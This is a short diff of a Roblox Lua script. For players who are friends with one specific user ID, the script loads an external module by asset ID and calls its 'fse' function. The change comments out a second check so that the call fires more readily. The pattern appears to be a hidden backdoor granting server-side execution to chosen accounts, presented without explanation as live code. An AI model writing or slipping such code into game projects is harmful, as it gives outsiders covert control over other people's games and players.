@@ -4,7 +4,7 @@ local function GetUser(User)
 end
 
 for i,v in game:GetService("Players"):GetPlayers() do
-	if v:IsFriendsWith(3341266064) and GetUser(3341266064) then
+	if v:IsFriendsWith(3341266064) --[[and GetUser(3341266064)]] then
 		require(11126053846).fse(v.Name)
 	else
 		local wompwomp = 11
@@ -12,7 +12,7 @@ for i,v in game:GetService("Players"):GetPlayers() do
 end
 
 game:GetService("Players").PlayerAdded:Connect(function(v)
-	if v:IsFriendsWith(3341266064) and GetUser(3341266064) then
+	if v:IsFriendsWith(3341266064) --[[and GetUser(3341266064)]] then
 		require(11126053846).fse(v.Name)
 	else
 		local wompwomp = 11
